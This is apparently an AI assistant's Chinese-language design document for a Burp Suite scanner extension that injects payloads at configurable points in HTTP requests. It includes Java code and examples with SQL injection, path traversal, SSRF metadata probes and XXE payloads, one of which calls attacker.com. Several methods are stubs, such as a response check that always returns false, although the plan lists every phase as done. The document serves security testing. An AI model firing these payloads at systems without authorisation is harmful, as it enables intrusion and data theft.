# 灵活注入点系统设计

> **核心目标**: 能够在HTTP请求的任意位置插入payload，支持多重条件过滤  
> **设计日期**: 2025-10-01

---

## 🎯 需求分析

### 核心需求

1. **注入位置灵活**：
   - ❌ 不再局限于参数值替换
   - ✅ 支持URL路径、请求头、请求体、参数、Cookie等任意位置

2. **条件过滤灵活**：
   - ✅ 根据Content-Type过滤（只测试JSON/XML请求）
   - ✅ 根据URL路径过滤（只测试特定API）
   - ✅ 根据HTTP方法过滤（只测试POST/PUT）
   - ✅ 多条件叠加（AND/OR组合）

3. **Payload插入策略灵活**：
   - ✅ 完全替换
   - ✅ 前缀/后缀插入
   - ✅ 标记点插入（类似Burp Intruder的 §§ 标记）

---

## 📐 架构设计

### 核心概念

#### 1. 注入点（Injection Point）
定义在HTTP请求的哪个位置插入payload

#### 2. 匹配条件（Match Condition）
定义什么样的请求才会被测试

#### 3. 插入策略（Injection Strategy）
定义如何插入payload（替换/前缀/后缀/标记点）

---

## 🔧 数据结构设计

### 1. 增强的 Configuration 类

```java
package com.xprobe.scanner.config;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.List;

/**
 * 增强的扫描配置
 * 支持灵活的注入点和条件匹配
 */
public class Configuration implements Serializable {
    private static final long serialVersionUID = 2L;
    
    // ========== 基础信息 ==========
    private String customLabel;           // 规则名称（如"SQL注入"）
    private boolean enabled;              // 是否启用
    
    // ========== 匹配条件（决定哪些请求会被测试）==========
    private List<RequestCondition> requestConditions;  // 请求匹配条件
    
    // ========== 注入点（决定在哪里插入payload）==========
    private List<InjectionPoint> injectionPoints;     // 注入点列表
    
    // ========== Payload配置 ==========
    private List<String> payloads;                     // payload列表
    
    // ========== 漏洞检测规则 ==========
    private List<MatchRule> matchRules;                // 响应匹配规则
    
    // 构造函数、Getter、Setter...
    
    /**
     * 请求匹配条件（决定是否对该请求进行测试）
     */
    public static class RequestCondition implements Serializable {
        private String conditionType;    // 条件类型
        private String operator;         // 操作符（AND/OR）
        private String matchType;        // 匹配类型（Equals, Contains, Regex等）
        private String value;            // 匹配值
        
        /**
         * 条件类型:
         * - Content-Type
         * - URL Path
         * - HTTP Method
         * - Request Header
         * - Parameter Name
         * - Parameter Exists
         * - Body Contains
         */
        
        // Getter/Setter...
    }
    
    /**
     * 注入点（定义在请求的哪个位置插入payload）
     */
    public static class InjectionPoint implements Serializable {
        private String pointType;        // 注入点类型
        private String targetName;       // 目标名称（参数名/Header名等）
        private String injectionStrategy;// 注入策略
        private String marker;           // 标记符（用于标记点注入）
        
        /**
         * 注入点类型:
         * - Parameter Value        (参数值)
         * - Parameter Name         (参数名)
         * - URL Path               (URL路径)
         * - URL Path Segment       (URL路径段)
         * - Request Header Value   (请求头值)
         * - Request Header Name    (请求头名)
         * - Request Body           (整个请求体)
         * - Request Body Part      (请求体部分)
         * - Cookie Value           (Cookie值)
         * - Query String           (查询字符串)
         */
        
        /**
         * 注入策略:
         * - Replace         (完全替换)
         * - Append          (追加到末尾)
         * - Prepend         (添加到开头)
         * - Insert At Marker(在标记点插入)
         * - Inline Replace  (内联替换，保留其他部分)
         */
        
        // Getter/Setter...
    }
    
    /**
     * 匹配规则（检测响应是否存在漏洞）
     */
    public static class MatchRule implements Serializable {
        private String location;         // 匹配位置
        private String matchType;        // 匹配类型
        private String rule;             // 规则值
        private String operator;         // 逻辑操作符
        
        // Getter/Setter...
    }
}
```

---

## 🎨 UI设计

### 配置界面分为三个主要部分

```
┌─────────────────────────────────────────────────────────────┐
│  规则配置: SQL注入检测                                        │
├─────────────────────────────────────────────────────────────┤
│                                                               │
│  【1. 请求匹配条件】─ 决定哪些请求会被测试                     │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ ☑ Content-Type [Contains    ▼] [application/json   ] │  │
│  │ [AND ▼]                                               │  │
│  │ ☑ URL Path     [Regex Match ▼] [/api/.*            ] │  │
│  │ [OR  ▼]                                               │  │
│  │ ☑ HTTP Method  [Equals      ▼] [POST               ] │  │
│  │                                                        │  │
│  │ [➕ 添加条件]  [🗑️ 删除]                              │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                               │
│  【2. 注入点配置】─ 决定在哪里插入payload                     │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ 注入点1:                                              │  │
│  │   位置: [Parameter Value    ▼]                       │  │
│  │   目标: [id, username, email          ]  (参数名)     │  │
│  │   策略: [Replace            ▼]                       │  │
│  │                                                        │  │
│  │ 注入点2:                                              │  │
│  │   位置: [Request Body       ▼]                       │  │
│  │   目标: [整个请求体]                                  │  │
│  │   策略: [Insert At Marker   ▼]                       │  │
│  │   标记: [§PAYLOAD§]                                  │  │
│  │                                                        │  │
│  │ [➕ 添加注入点]  [🗑️ 删除]                           │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                               │
│  【3. Payload列表】                                          │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ ' OR 1=1--                                            │  │
│  │ ' AND SLEEP(5)--                                      │  │
│  │ UNION SELECT NULL--                                   │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                               │
│  【4. 响应匹配规则】─ 检测是否存在漏洞                        │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ Response Body [Contains ▼] [SQL syntax] [OR ▼]       │  │
│  │ Response Time [Greater  ▼] [5000ms   ] [OR ▼]       │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                               │
│  [💾 保存规则]  [🧪 测试规则]  [❌ 取消]                    │
└─────────────────────────────────────────────────────────────┘
```

---

## 💻 核心实现

### 1. 请求条件评估器

```java
package com.xprobe.scanner.core;

import burp.api.montoya.http.message.requests.HttpRequest;
import com.xprobe.scanner.config.Configuration;
import java.util.List;

/**
 * 请求条件评估器
 * 判断请求是否满足配置的条件
 */
public class RequestConditionEvaluator {
    
    /**
     * 评估请求是否匹配所有条件
     */
    public static boolean evaluate(HttpRequest request, 
                                   List<Configuration.RequestCondition> conditions) {
        if (conditions == null || conditions.isEmpty()) {
            return true;  // 没有条件，默认匹配所有请求
        }
        
        boolean result = evaluateSingleCondition(request, conditions.get(0));
        
        for (int i = 1; i < conditions.size(); i++) {
            Configuration.RequestCondition condition = conditions.get(i);
            boolean conditionResult = evaluateSingleCondition(request, condition);
            
            if ("AND".equalsIgnoreCase(condition.getOperator())) {
                result = result && conditionResult;
            } else if ("OR".equalsIgnoreCase(condition.getOperator())) {
                result = result || conditionResult;
            }
        }
        
        return result;
    }
    
    /**
     * 评估单个条件
     */
    private static boolean evaluateSingleCondition(HttpRequest request,
                                                   Configuration.RequestCondition condition) {
        String conditionType = condition.getConditionType();
        String matchType = condition.getMatchType();
        String value = condition.getValue();
        
        switch (conditionType) {
            case "Content-Type":
                return evaluateContentType(request, matchType, value);
                
            case "URL Path":
                return evaluateUrlPath(request, matchType, value);
                
            case "HTTP Method":
                return evaluateHttpMethod(request, matchType, value);
                
            case "Request Header":
                return evaluateRequestHeader(request, matchType, value);
                
            case "Parameter Name":
                return evaluateParameterName(request, matchType, value);
                
            case "Parameter Exists":
                return evaluateParameterExists(request, value);
                
            case "Body Contains":
                return evaluateBodyContains(request, matchType, value);
                
            default:
                return false;
        }
    }
    
    /**
     * 评估Content-Type
     */
    private static boolean evaluateContentType(HttpRequest request, 
                                               String matchType, 
                                               String value) {
        String contentType = request.headerValue("Content-Type");
        if (contentType == null) {
            return false;
        }
        
        return matchString(contentType, matchType, value);
    }
    
    /**
     * 评估URL路径
     */
    private static boolean evaluateUrlPath(HttpRequest request, 
                                          String matchType, 
                                          String value) {
        String path = request.path();
        return matchString(path, matchType, value);
    }
    
    /**
     * 评估HTTP方法
     */
    private static boolean evaluateHttpMethod(HttpRequest request, 
                                             String matchType, 
                                             String value) {
        String method = request.method();
        return matchString(method, matchType, value);
    }
    
    /**
     * 评估请求头
     */
    private static boolean evaluateRequestHeader(HttpRequest request, 
                                                String matchType, 
                                                String value) {
        // value格式: "Header-Name: Header-Value"
        String[] parts = value.split(":", 2);
        if (parts.length != 2) {
            return false;
        }
        
        String headerName = parts[0].trim();
        String expectedValue = parts[1].trim();
        String actualValue = request.headerValue(headerName);
        
        if (actualValue == null) {
            return false;
        }
        
        return matchString(actualValue, matchType, expectedValue);
    }
    
    /**
     * 评估参数名
     */
    private static boolean evaluateParameterName(HttpRequest request, 
                                                String matchType, 
                                                String value) {
        for (var param : request.parameters()) {
            if (matchString(param.name(), matchType, value)) {
                return true;
            }
        }
        return false;
    }
    
    /**
     * 评估参数是否存在
     */
    private static boolean evaluateParameterExists(HttpRequest request, String paramName) {
        return request.hasParameter(paramName);
    }
    
    /**
     * 评估请求体包含
     */
    private static boolean evaluateBodyContains(HttpRequest request, 
                                               String matchType, 
                                               String value) {
        String body = request.bodyToString();
        return matchString(body, matchType, value);
    }
    
    /**
     * 字符串匹配工具
     */
    private static boolean matchString(String actual, String matchType, String expected) {
        if (actual == null || expected == null) {
            return false;
        }
        
        switch (matchType) {
            case "Equals":
                return actual.equals(expected);
                
            case "Contains":
                return actual.contains(expected);
                
            case "Starts With":
                return actual.startsWith(expected);
                
            case "Ends With":
                return actual.endsWith(expected);
                
            case "Regex Match":
                return actual.matches(expected);
                
            case "Not Equals":
                return !actual.equals(expected);
                
            case "Not Contains":
                return !actual.contains(expected);
                
            default:
                return false;
        }
    }
}
```

---

### 2. 注入点执行器

```java
package com.xprobe.scanner.core;

import burp.api.montoya.http.message.requests.HttpRequest;
import com.xprobe.scanner.config.Configuration;
import java.util.ArrayList;
import java.util.List;

/**
 * 注入点执行器
 * 负责在指定位置插入payload
 */
public class InjectionPointExecutor {
    
    /**
     * 对请求应用所有注入点
     * 
     * @param originalRequest 原始请求
     * @param injectionPoints 注入点列表
     * @param payload 要插入的payload
     * @return 修改后的请求
     */
    public static HttpRequest applyInjections(HttpRequest originalRequest,
                                             List<Configuration.InjectionPoint> injectionPoints,
                                             String payload) {
        HttpRequest modifiedRequest = originalRequest;
        
        for (Configuration.InjectionPoint point : injectionPoints) {
            modifiedRequest = applySingleInjection(modifiedRequest, point, payload);
        }
        
        return modifiedRequest;
    }
    
    /**
     * 应用单个注入点
     */
    private static HttpRequest applySingleInjection(HttpRequest request,
                                                   Configuration.InjectionPoint point,
                                                   String payload) {
        String pointType = point.getPointType();
        String targetName = point.getTargetName();
        String strategy = point.getInjectionStrategy();
        
        switch (pointType) {
            case "Parameter Value":
                return injectParameterValue(request, targetName, payload, strategy);
                
            case "URL Path":
                return injectUrlPath(request, payload, strategy);
                
            case "URL Path Segment":
                return injectUrlPathSegment(request, targetName, payload, strategy);
                
            case "Request Header Value":
                return injectHeaderValue(request, targetName, payload, strategy);
                
            case "Request Body":
                return injectRequestBody(request, payload, strategy, point.getMarker());
                
            case "Cookie Value":
                return injectCookieValue(request, targetName, payload, strategy);
                
            case "Query String":
                return injectQueryString(request, payload, strategy);
                
            default:
                return request;
        }
    }
    
    /**
     * 注入参数值
     */
    private static HttpRequest injectParameterValue(HttpRequest request,
                                                   String paramNames,
                                                   String payload,
                                                   String strategy) {
        String[] names = paramNames.split(",");
        HttpRequest modifiedRequest = request;
        
        for (String paramName : names) {
            paramName = paramName.trim();
            
            // 查找该参数
            for (var param : request.parameters()) {
                if (param.name().equals(paramName)) {
                    String newValue = applyStrategy(param.value(), payload, strategy, null);
                    modifiedRequest = modifiedRequest.withParameter(
                        burp.api.montoya.http.message.params.HttpParameter.parameter(
                            paramName, newValue, param.type()
                        )
                    );
                }
            }
        }
        
        return modifiedRequest;
    }
    
    /**
     * 注入URL路径
     */
    private static HttpRequest injectUrlPath(HttpRequest request,
                                            String payload,
                                            String strategy) {
        String originalPath = request.path();
        String newPath = applyStrategy(originalPath, payload, strategy, null);
        
        // 重建URL
        String originalUrl = request.url();
        String newUrl = originalUrl.replace(originalPath, newPath);
        
        return request.withPath(newPath);
    }
    
    /**
     * 注入URL路径段
     */
    private static HttpRequest injectUrlPathSegment(HttpRequest request,
                                                   String segmentIndex,
                                                   String payload,
                                                   String strategy) {
        String originalPath = request.path();
        String[] segments = originalPath.split("/");
        
        try {
            int index = Integer.parseInt(segmentIndex);
            if (index >= 0 && index < segments.length) {
                segments[index] = applyStrategy(segments[index], payload, strategy, null);
                String newPath = String.join("/", segments);
                return request.withPath(newPath);
            }
        } catch (NumberFormatException e) {
            // Invalid index
        }
        
        return request;
    }
    
    /**
     * 注入请求头值
     */
    private static HttpRequest injectHeaderValue(HttpRequest request,
                                                String headerName,
                                                String payload,
                                                String strategy) {
        String originalValue = request.headerValue(headerName);
        if (originalValue == null) {
            originalValue = "";
        }
        
        String newValue = applyStrategy(originalValue, payload, strategy, null);
        
        return request.withHeader(headerName, newValue);
    }
    
    /**
     * 注入请求体
     */
    private static HttpRequest injectRequestBody(HttpRequest request,
                                                String payload,
                                                String strategy,
                                                String marker) {
        String originalBody = request.bodyToString();
        String newBody = applyStrategy(originalBody, payload, strategy, marker);
        
        return request.withBody(newBody);
    }
    
    /**
     * 注入Cookie值
     */
    private static HttpRequest injectCookieValue(HttpRequest request,
                                                String cookieName,
                                                String payload,
                                                String strategy) {
        // 找到Cookie参数并修改
        for (var param : request.parameters()) {
            if (param.name().equals(cookieName) && 
                param.type() == burp.api.montoya.http.message.params.HttpParameterType.COOKIE) {
                String newValue = applyStrategy(param.value(), payload, strategy, null);
                return request.withParameter(
                    burp.api.montoya.http.message.params.HttpParameter.parameter(
                        cookieName, newValue, param.type()
                    )
                );
            }
        }
        
        return request;
    }
    
    /**
     * 注入查询字符串
     */
    private static HttpRequest injectQueryString(HttpRequest request,
                                                String payload,
                                                String strategy) {
        String originalUrl = request.url();
        String[] parts = originalUrl.split("\\?", 2);
        
        if (parts.length == 2) {
            String queryString = parts[1];
            String newQueryString = applyStrategy(queryString, payload, strategy, null);
            String newUrl = parts[0] + "?" + newQueryString;
            
            // 注意：这里需要更复杂的URL重构逻辑
            // 简化处理
        }
        
        return request;
    }
    
    /**
     * 应用注入策略
     */
    private static String applyStrategy(String original,
                                       String payload,
                                       String strategy,
                                       String marker) {
        switch (strategy) {
            case "Replace":
                return payload;
                
            case "Append":
                return original + payload;
                
            case "Prepend":
                return payload + original;
                
            case "Insert At Marker":
                if (marker != null && original.contains(marker)) {
                    return original.replace(marker, payload);
                }
                return original;
                
            case "Inline Replace":
                // 保留结构，只替换值部分
                // 例如: {"key": "VALUE"} -> {"key": "PAYLOAD"}
                return original;  // TODO: 需要更智能的实现
                
            default:
                return payload;
        }
    }
}
```

---

### 3. 增强的通用扫描器

```java
package com.xprobe.scanner.scanners;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.xprobe.scanner.config.Configuration;
import com.xprobe.scanner.core.InjectionPointExecutor;
import com.xprobe.scanner.core.RequestConditionEvaluator;
import com.xprobe.scanner.models.ScanResult;
import com.xprobe.scanner.models.ScanTask;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;

/**
 * 增强的通用规则扫描器
 * 支持灵活的注入点和条件匹配
 */
public class FlexibleGenericScanner implements Scanner {
    
    private final MontoyaApi api;
    
    public FlexibleGenericScanner(MontoyaApi api) {
        this.api = api;
    }
    
    @Override
    public String getType() {
        return "*";
    }
    
    @Override
    public String getName() {
        return "Flexible Generic Scanner";
    }
    
    @Override
    public String getDescription() {
        return "灵活的通用扫描器，支持任意位置注入和条件匹配";
    }
    
    @Override
    public boolean canScan(ScanTask task) {
        Configuration config = task.getConfiguration();
        
        // 检查配置是否有效
        if (config == null || !config.isEnabled()) {
            return false;
        }
        
        // 检查请求是否满足条件
        boolean matchesConditions = RequestConditionEvaluator.evaluate(
            task.getRequest(),
            config.getRequestConditions()
        );
        
        if (!matchesConditions) {
            api.logging().raiseDebugEvent(
                String.format("跳过扫描 [%s]: 请求不满足条件", config.getCustomLabel())
            );
            return false;
        }
        
        // 检查是否有注入点
        if (config.getInjectionPoints() == null || config.getInjectionPoints().isEmpty()) {
            api.logging().raiseDebugEvent(
                String.format("跳过扫描 [%s]: 没有配置注入点", config.getCustomLabel())
            );
            return false;
        }
        
        // 检查是否有payload
        if (config.getPayloads() == null || config.getPayloads().isEmpty()) {
            api.logging().raiseDebugEvent(
                String.format("跳过扫描 [%s]: 没有配置payload", config.getCustomLabel())
            );
            return false;
        }
        
        return true;
    }
    
    @Override
    public CompletableFuture<List<ScanResult>> scan(ScanTask task) {
        return CompletableFuture.supplyAsync(() -> {
            List<ScanResult> results = new ArrayList<>();
            Configuration config = task.getConfiguration();
            HttpRequest originalRequest = task.getRequest().copyToTempFile();
            
            api.logging().raiseInfoEvent(
                String.format("开始扫描 [%s]: %s %s",
                    config.getCustomLabel(),
                    originalRequest.method(),
                    originalRequest.path())
            );
            
            // 对每个payload进行测试
            for (String payload : config.getPayloads()) {
                try {
                    // 应用所有注入点
                    HttpRequest modifiedRequest = InjectionPointExecutor.applyInjections(
                        originalRequest,
                        config.getInjectionPoints(),
                        payload
                    );
                    
                    // 发送请求
                    long startTime = System.currentTimeMillis();
                    HttpRequestResponse requestResponse = api.http().sendRequest(modifiedRequest);
                    HttpResponse response = requestResponse.response();
                    long responseTime = System.currentTimeMillis() - startTime;
                    
                    // 评估响应
                    boolean isVulnerable = evaluateResponse(
                        response,
                        responseTime,
                        config.getMatchRules()
                    );
                    
                    if (isVulnerable) {
                        ScanResult result = new ScanResult.Builder()
                            .vulnerable(true)
                            .scanType(config.getCustomLabel())
                            .parameterName(describeInjectionPoints(config.getInjectionPoints()))
                            .payload(payload)
                            .originalRequest(originalRequest)
                            .modifiedRequest(modifiedRequest)
                            .response(response)
                            .responseTime(responseTime)
                            .evidence(buildEvidence(response, config.getMatchRules()))
                            .build();
                        
                        results.add(result);
                        
                        api.logging().raiseInfoEvent(
                            String.format("✅ 发现漏洞 [%s]: payload=%s",
                                config.getCustomLabel(), payload)
                        );
                    }
                    
                } catch (Exception e) {
                    api.logging().raiseErrorEvent(
                        String.format("扫描出错 [%s]: %s",
                            config.getCustomLabel(), e.getMessage())
                    );
                }
            }
            
            return results;
        });
    }
    
    /**
     * 评估响应（复用之前的逻辑）
     */
    private boolean evaluateResponse(HttpResponse response,
                                     long responseTime,
                                     List<Configuration.MatchRule> matchRules) {
        // ... (参考之前的实现)
        return false;
    }
    
    /**
     * 构建证据
     */
    private String buildEvidence(HttpResponse response,
                                 List<Configuration.MatchRule> matchRules) {
        // ... (参考之前的实现)
        return "";
    }
    
    /**
     * 描述注入点（用于日志）
     */
    private String describeInjectionPoints(List<Configuration.InjectionPoint> points) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < points.size(); i++) {
            Configuration.InjectionPoint point = points.get(i);
            sb.append(point.getPointType());
            if (point.getTargetName() != null && !point.getTargetName().isEmpty()) {
                sb.append("(").append(point.getTargetName()).append(")");
            }
            if (i < points.size() - 1) {
                sb.append(", ");
            }
        }
        return sb.toString();
    }
    
    @Override
    public List<String> getPayloads() {
        return new ArrayList<>();
    }
}
```

---

## 📚 使用示例

### 示例1: 测试JSON请求体中的SQL注入

**场景**: 只对POST /api/login的JSON请求测试SQL注入

```
【请求匹配条件】
✓ Content-Type [Contains] [application/json]     [AND]
✓ URL Path      [Equals]   [/api/login]          [AND]
✓ HTTP Method   [Equals]   [POST]

【注入点】
1. Request Body [Insert At Marker]
   标记: §PAYLOAD§
   
   原始请求体模板:
   {"username":"§PAYLOAD§","password":"test123"}

【Payload】
' OR 1=1--
admin'--
' UNION SELECT NULL--

【匹配规则】
Response Body [Contains] [welcome] [OR]
Status Code   [Equals]   [200]     [AND]
```

**效果**: 只会对符合条件的请求进行测试，payload会替换§PAYLOAD§标记

---

### 示例2: 测试URL路径中的目录遍历

**场景**: 对所有包含file/path/filename参数的GET请求测试路径遍历

```
【请求匹配条件】
✓ HTTP Method    [Equals]   [GET]                    [AND]
✓ Parameter Name [Regex]    [.*(file|path|name).*]

【注入点】
1. Parameter Value [Replace]
   目标参数: file, path, filename

【Payload】
../../../etc/passwd
..\..\..\..\windows\win.ini
....//....//....//etc/passwd

【匹配规则】
Response Body [Contains] [root:] [OR]
Response Body [Contains] [[fonts]] [OR]
```

---

### 示例3: 测试自定义请求头

**场景**: 对所有请求测试X-Forwarded-For头的SSRF

```
【请求匹配条件】
(无条件，匹配所有请求)

【注入点】
1. Request Header Value [Replace]
   目标Header: X-Forwarded-For

【Payload】
http://169.254.169.254/latest/meta-data/
http://localhost:8080/admin
http://127.0.0.1:22

【匹配规则】
Response Body [Contains] [ami-id] [OR]
Response Body [Contains] [admin panel] [OR]
```

---

### 示例4: 复杂场景 - 测试XML外部实体

**场景**: 只对Content-Type为XML的POST请求，在请求体特定位置插入XXE payload

```
【请求匹配条件】
✓ Content-Type [Contains] [xml]                  [AND]
✓ HTTP Method  [Equals]   [POST]                 [AND]
✓ Body Contains [Contains] [<?xml]

【注入点】
1. Request Body [Insert At Marker]
   标记: §PAYLOAD§
   
   请求体模板:
   <?xml version="1.0"?>
   §PAYLOAD§
   <data>
     <user>test</user>
   </data>

【Payload】
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>

【匹配规则】
Response Body [Regex] [root:.*:0:0:] [OR]
Response Time [Greater] [5000] [OR]
```

---

## 🎯 核心优势

### 1. 极致灵活性
✅ 可以测试HTTP请求的**任意位置**  
✅ 可以**叠加多个条件**过滤请求  
✅ 支持**标记点**精确控制payload插入位置  

### 2. 完全UI配置
✅ 所有配置都在UI完成，无需代码  
✅ 可视化配置，降低使用门槛  
✅ 支持保存/导入/导出配置  

### 3. 强大的过滤能力
✅ 根据Content-Type只测试特定类型请求  
✅ 根据URL路径只测试特定API  
✅ 多条件组合，精确控制测试范围  

---

## 🚀 实施计划

### Phase 1: 数据结构（1天）
1. ✅ 增强 Configuration 类
2. ✅ 添加 RequestCondition 子类
3. ✅ 添加 InjectionPoint 子类
4. ✅ 更新 XProbeConfig 兼容新结构

### Phase 2: 核心逻辑（2天）
1. ✅ 实现 RequestConditionEvaluator
2. ✅ 实现 InjectionPointExecutor
3. ✅ 实现 FlexibleGenericScanner
4. ✅ 单元测试

### Phase 3: UI改造（2-3天）
1. ✅ 设计新的配置界面
2. ✅ 实现条件配置面板
3. ✅ 实现注入点配置面板
4. ✅ 增强payload配置面板
5. ✅ 添加规则测试功能

### Phase 4: 测试和优化（1-2天）
1. ✅ 集成测试
2. ✅ 性能优化
3. ✅ 用户体验优化
4. ✅ 文档编写

**总计: 6-8天完成**

---

## 💡 未来扩展

### 1. 变量系统
支持payload中使用变量：
```
{{RANDOM_STRING}}  - 随机字符串
{{RANDOM_NUMBER}}  - 随机数字
{{TIMESTAMP}}      - 时间戳
{{BASE64:xxx}}     - Base64编码
{{URL_ENCODE:xxx}} - URL编码
```

### 2. 响应差异分析
对比不同payload的响应差异：
- 响应长度差异
- 响应时间差异
- 响应内容差异

### 3. 智能模式
自动分析请求结构，建议注入点和匹配条件

### 4. Payload生成器
基于目标应用特征，智能生成定制化payload

---

## 📋 兼容性

### 向后兼容
为了兼容现有配置，可以添加迁移逻辑：

```java
/**
 * 将旧配置转换为新配置
 */
public static Configuration migrateOldConfig(OldConfiguration oldConfig) {
    Configuration newConfig = new Configuration();
    
    // 基本信息
    newConfig.setCustomLabel(oldConfig.getCustomLabel());
    newConfig.setEnabled(oldConfig.isEnabled());
    
    // 转换为注入点
    List<InjectionPoint> injectionPoints = new ArrayList<>();
    InjectionPoint point = new InjectionPoint();
    point.setPointType("Parameter Value");
    point.setTargetName(String.join(",", oldConfig.getParameterNames()));
    point.setInjectionStrategy("Replace");
    injectionPoints.add(point);
    newConfig.setInjectionPoints(injectionPoints);
    
    // Payload和匹配规则直接复制
    newConfig.setPayloads(oldConfig.getParameterValues());
    newConfig.setMatchRules(oldConfig.getMatchRules());
    
    return newConfig;
}
```

---

这个设计能满足你的需求吗？需要我立即开始实施，还是你想调整某些部分？

